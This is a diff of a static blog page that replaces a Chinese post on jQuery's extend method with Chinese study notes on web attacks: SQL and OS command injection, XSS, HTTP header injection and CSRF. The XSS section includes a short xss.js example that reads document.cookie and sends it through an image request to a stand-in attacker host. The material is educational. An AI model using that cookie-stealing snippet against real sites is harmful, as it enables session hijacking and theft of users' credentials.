@@ -6,18 +6,30 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://muzicy.github.io">
-  <title>JQuery源码中extend方法了解 | muzicy</title>
+  <title>Web的攻击技术 | muzicy</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="jQuery.extend(obj)是为扩展Jquery类本身而添加的方法，可以理解为静态方法, jQuery.fn.extend(obj)因为jQuery.fn = jQuery.prototype 因此可以看到是为jQuery类添加成员函数， jQuery类的实例可以共享这个方法。jQuery.extend() 的调用并不会把方法扩展到对象的实例上，引用它的方法也需要通过jQuery类来实现，">
+  <meta name="description" content="Web应用的攻击模式：
+
+主动攻击  2. 被动攻击
+
+1.以服务器为目标的主动攻击： 主动攻击是指攻击者通过直接访问Web应用， 把攻击代码传入的攻击模式 ， 主动攻击模式最具有代表性的攻击是 SQL注入攻击和OS命令注入攻击  1.SQL注入攻击: 是指针对WebYin应用使用的数据库，通过运行非法的SQL而产生的攻击。  2 OS命令注入攻击是只通过Web应用，执行非法的操作系统命令达到攻击">
 <meta property="og:type" content="article">
-<meta property="og:title" content="JQuery源码中extend方法了解">
-<meta property="og:url" content="https://muzicy.github.io/2017/03/16/JQuery源码中extend方法了解/index.html">
+<meta property="og:title" content="Web的攻击技术">
+<meta property="og:url" content="https://muzicy.github.io/2017/03/23/Web的攻击技术/index.html">
 <meta property="og:site_name" content="muzicy">
-<meta property="og:description" content="jQuery.extend(obj)是为扩展Jquery类本身而添加的方法，可以理解为静态方法, jQuery.fn.extend(obj)因为jQuery.fn = jQuery.prototype 因此可以看到是为jQuery类添加成员函数， jQuery类的实例可以共享这个方法。jQuery.extend() 的调用并不会把方法扩展到对象的实例上，引用它的方法也需要通过jQuery类来实现，">
-<meta property="og:updated_time" content="2017-03-16T02:32:08.789Z">
+<meta property="og:description" content="Web应用的攻击模式：
+
+主动攻击  2. 被动攻击
+
+1.以服务器为目标的主动攻击： 主动攻击是指攻击者通过直接访问Web应用， 把攻击代码传入的攻击模式 ， 主动攻击模式最具有代表性的攻击是 SQL注入攻击和OS命令注入攻击  1.SQL注入攻击: 是指针对WebYin应用使用的数据库，通过运行非法的SQL而产生的攻击。  2 OS命令注入攻击是只通过Web应用，执行非法的操作系统命令达到攻击">
+<meta property="og:updated_time" content="2017-03-23T07:30:14.644Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="JQuery源码中extend方法了解">
-<meta name="twitter:description" content="jQuery.extend(obj)是为扩展Jquery类本身而添加的方法，可以理解为静态方法, jQuery.fn.extend(obj)因为jQuery.fn = jQuery.prototype 因此可以看到是为jQuery类添加成员函数， jQuery类的实例可以共享这个方法。jQuery.extend() 的调用并不会把方法扩展到对象的实例上，引用它的方法也需要通过jQuery类来实现，">
+<meta name="twitter:title" content="Web的攻击技术">
+<meta name="twitter:description" content="Web应用的攻击模式：
+
+主动攻击  2. 被动攻击
+
+1.以服务器为目标的主动攻击： 主动攻击是指攻击者通过直接访问Web应用， 把攻击代码传入的攻击模式 ， 主动攻击模式最具有代表性的攻击是 SQL注入攻击和OS命令注入攻击  1.SQL注入攻击: 是指针对WebYin应用使用的数据库，通过运行非法的SQL而产生的攻击。  2 OS命令注入攻击是只通过Web应用，执行非法的操作系统命令达到攻击">
   
     <link rel="alternative" href="/atom.xml" title="muzicy" type="application/atom+xml">
   
@@ -157,32 +169,48 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-JQuery源码中extend方法了解" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-Web的攻击技术" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      JQuery源码中extend方法了解
+      Web的攻击技术
     </h1>
   
 
         
-        <a href="/2017/03/16/JQuery源码中extend方法了解/" class="archive-article-date">
-  	<time datetime="2017-03-16T01:49:09.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-03-16</time>
+        <a href="/2017/03/23/Web的攻击技术/" class="archive-article-date">
+  	<time datetime="2017-03-23T06:20:46.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-03-23</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>jQuery.extend(obj)是为扩展Jquery类本身而添加的方法，可以理解为静态方法, jQuery.fn.extend(obj)因为jQuery.fn = jQuery.prototype 因此可以看到是为jQuery类添加成员函数， jQuery类的实例可以共享这个方法。<br>jQuery.extend() 的调用并不会把方法扩展到对象的实例上，引用它的方法也需要通过jQuery类来实现，如jQuery.ajax()，而 jQuery.fn.extend()的调用把方法扩展到了对象的prototype上，所以实例化一个jQuery对象的时候，它就具有了这些方法.</p>
-<p>jQuery.extend( target, object1, [objectN])  返回被扩展的对象<br>jQuery.fn.extend(object);</p>
-<p>源码如下：</p>
-<p>代码中可以看到jQuery.extend = jQuery.fn.extend 这两者共享同一个方法。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div></pre></td><td class="code"><pre><div class="line">jQuery.extend = jQuery.fn.extend = <span class="function"><span class="title">function</span></span>() &#123;</div><div class="line">	var options, name, src, copy, copyIsArray, <span class="built_in">clone</span>,</div><div class="line">	   // target是指被扩展的对象</div><div class="line">		target = arguments[ 0 ] || &#123;&#125;,</div><div class="line">		i = 1,</div><div class="line">		length = arguments.length,</div><div class="line">		deep = <span class="literal">false</span>;</div><div class="line"></div><div class="line">	// Handle a deep copy situation</div><div class="line">	<span class="keyword">if</span> ( typeof target === <span class="string">"boolean"</span> ) &#123;</div><div class="line">		deep = target;</div><div class="line"></div><div class="line">		// Skip the boolean and the target</div><div class="line">		target = arguments[ i ] || &#123;&#125;;</div><div class="line">		i++;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	// Handle <span class="keyword">case</span> when target is a string or something (possible <span class="keyword">in</span> deep copy)</div><div class="line">	<span class="keyword">if</span> ( typeof target !== <span class="string">"object"</span> &amp;&amp; !jQuery.isFunction( target ) ) &#123;</div><div class="line">		target = &#123;&#125;;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	// Extend jQuery itself <span class="keyword">if</span> only one argument is passed</div><div class="line">	<span class="keyword">if</span> ( i === length ) &#123;</div><div class="line">		target = this;</div><div class="line">		i--;</div><div class="line">	&#125;</div><div class="line">    //</div><div class="line">	<span class="keyword">for</span> ( ; i &lt; length; i++ ) &#123;</div><div class="line"></div><div class="line">		// Only deal with non-null/undefined values</div><div class="line">		<span class="keyword">if</span> ( ( options = arguments[ i ] ) != null ) &#123;</div><div class="line"></div><div class="line">			// Extend the base object</div><div class="line">			<span class="keyword">for</span> ( name <span class="keyword">in</span> options ) &#123;</div><div class="line">				src = target[ name ];</div><div class="line">				copy = options[ name ];</div><div class="line"></div><div class="line">				// Prevent never-ending loop</div><div class="line">				<span class="keyword">if</span> ( target === copy ) &#123;</div><div class="line">					<span class="built_in">continue</span>;</div><div class="line">				&#125;</div><div class="line"></div><div class="line">				// Recurse <span class="keyword">if</span> we<span class="string">'re merging plain objects or arrays</span></div><div class="line">				if ( deep &amp;&amp; copy &amp;&amp; ( jQuery.isPlainObject( copy ) ||</div><div class="line">					( copyIsArray = jQuery.isArray( copy ) ) ) ) &#123;</div><div class="line"></div><div class="line">					if ( copyIsArray ) &#123;</div><div class="line">						copyIsArray = false;</div><div class="line">						clone = src &amp;&amp; jQuery.isArray( src ) ? src : [];</div><div class="line"></div><div class="line">					&#125; else &#123;</div><div class="line">						clone = src &amp;&amp; jQuery.isPlainObject( src ) ? src : &#123;&#125;;</div><div class="line">					&#125;</div><div class="line"></div><div class="line">					// Never move original objects, clone them</div><div class="line">					target[ name ] = jQuery.extend( deep, clone, copy );</div><div class="line"></div><div class="line">				// Don't bring <span class="keyword">in</span> undefined values</div><div class="line">				&#125; <span class="keyword">else</span> <span class="keyword">if</span> ( copy !== undefined ) &#123;</div><div class="line">					target[ name ] = copy;</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	// Return the modified object</div><div class="line">	<span class="built_in">return</span> target;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
-<p>假设现在要编写一个插件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$.fn.extend(&#123;          </div><div class="line">    alertWhileClick:<span class="function"><span class="title">function</span></span>() &#123;            </div><div class="line">          $(this).click(<span class="function"><span class="title">function</span></span>()&#123;                 </div><div class="line">                 alert($(this).val());           </div><div class="line">           &#125;);           </div><div class="line">     &#125;       </div><div class="line">&#125;);       </div><div class="line">$(<span class="string">"#obtn"</span>).alertWhileClick();</div></pre></td></tr></table></figure></p>
-<p>从上面的代码可以看到，这个插件方法是扩展到Juqery类中的原型中的方法， 因此被Jquery的实例所共享。<br>或者在Jquery对象上扩展方法，如图$.ajax()方法一样是可以直接由这个对象所调用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$.extend(&#123;          </div><div class="line">    alertWhileClick:<span class="function"><span class="title">function</span></span>() &#123;            </div><div class="line">          $(this).click(<span class="function"><span class="title">function</span></span>()&#123;                 </div><div class="line">                 alert($(this).val());           </div><div class="line">           &#125;);           </div><div class="line">     &#125;       </div><div class="line">&#125;);       </div><div class="line">$.alertWhileClick();</div></pre></td></tr></table></figure></p>
+        <p>Web应用的攻击模式：</p>
+<ol>
+<li>主动攻击  2. 被动攻击</li>
+</ol>
+<p>1.以服务器为目标的主动攻击： 主动攻击是指攻击者通过直接访问Web应用， 把攻击代码传入的攻击模式 ， 主动攻击模式最具有代表性的攻击是 SQL注入攻击和OS命令注入攻击<br>  1.SQL注入攻击: 是指针对WebYin应用使用的数据库，通过运行非法的SQL而产生的攻击。<br>  2 OS命令注入攻击是只通过Web应用，执行非法的操作系统命令达到攻击的目的</p>
+<p>2.以服务器为目标的被动攻击： 被动攻击是指利用全套策略执行代码的攻击模式。被动攻击过程中，攻击者不直接对目标Web英语访问发起攻击。<br>   被动攻击的攻击模式如下：1。 攻击者诱使用户点击已经设置好的陷阱， 而陷阱会启动发送已嵌入攻击代码的http请求。  2. 当用户不知不觉中招后，用户的浏览器或邮件客户端就会触发这个陷阱。 3. 中招后的用户浏览器会把含有攻击代码的HTTP请求发送给作为攻击目标的Web应用， 运行攻击代码。 4.执行完攻击代码，存在安全漏洞的Web应用汇称为攻击者的调班， 可能导致用户所持的Cookie等个人信息被窃取， 登录状态中的用户权限遭恶意滥用等后果，<br>    典型的攻击模式中具有代表性的攻击是跨站脚本攻击（XSS） 和 跨站点请求伪造（CSRF）;</p>
+<p>  2.1 跨站脚本攻击（XSS)：<br>      定义：是指在存有安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或者Javascript进行的一种攻击。 动态创建的脚本可能隐藏着安全漏洞。<br>      跨站脚本攻击可能造成的影响: </p>
+<pre><code>   1. 利用虚假输入表单骗取用户个人信息
+   2. 利用脚本窃取用户的Cookie值， 被害者在不知情的情况下帮助攻击者发送恶意请求
+   3. 显示伪造的文章或者图片
+
+跨站脚本攻击的案例：
+  在表单中设入的圈套：
+         1、在输入用户信息的时候，可能输入含有恶意的HTML标签， 动态生成HTML处发生
+         2.某些网站通过URL中的查询字段来指定表单用户的ID,  攻击者在这个URL后面嵌入恶意代码的URL,这段URL包含脚本， 那么在浏览器打开该URL后， 设置好的脚本会运行，将用户输入的认证信息发送到攻击者网站
+  对用户Cookie信息的获取:
+       在脚本内嵌入指定的xss.js 文件
+       该文件定义如下:
+       <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">var content = escape(document.cookie);</div><div class="line">document.write(<span class="string">'&lt;img src = http://hackr.js/?&gt;'</span>);</div><div class="line">document.write(content);</div><div class="line">document.write(<span class="string">'&gt;'</span>);</div></pre></td></tr></table></figure>
+
+      在存在可跨站脚本攻击安全漏洞的Web应用上执行上面这段js代码， 即可访问该域名下的Cookie信息， 然后将这些信息发送至攻击者的Web网站， 记录在它的登陆日志中
+</code></pre><p>   2.2 HTTP首部注入攻击<br>        是指攻击者通过响应首部字段内插入换行，添加任意响应首部或者主体的一种攻击模式，可能造成的影响: 设置任意的Cookie信息， 重定向至任意的URL, 显示任意的主体（向首部主体内添加内容– HTTP响应式截断效应）<br>   2.3 跨站点请求伪造攻击是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或车顶信息等某些状态的更新。</p>
 
       
 
@@ -217,7 +245,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Jquery</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">web  攻击</a>
         		</li>
       		
 		</ul>
@@ -273,7 +301,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=https://muzicy.github.io/2017/03/16/JQuery源码中extend方法了解/" alt="微信分享二维码">
+      <img src="http://s.jiathis.com/qrcode.php?url=https://muzicy.github.io/2017/03/23/Web的攻击技术/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -287,18 +315,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2017/03/17/js构造函数/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          js构造函数
-        
-      </div>
-    </a>
   
-  
-    <a href="/2017/03/16/JQuery源码构造Jquery对象/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">JQuery源码构造Jquery对象</div>
+    <a href="/2017/03/22/关于数组去重的几种方法/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">关于数组去重的几种方法</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -312,7 +331,7 @@
   
   <div class="duoshuo">
 	<!-- 多说评论框 start -->
-	<div class="ds-thread" data-thread-key="JQuery源码中extend方法了解" data-title="JQuery源码中extend方法了解" data-url="https://muzicy.github.io/2017/03/16/JQuery源码中extend方法了解/"></div>
+	<div class="ds-thread" data-thread-key="Web的攻击技术" data-title="Web的攻击技术" data-url="https://muzicy.github.io/2017/03/23/Web的攻击技术/"></div>
 	<!-- 多说评论框 end -->
 	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
 	<script type="text/javascript">
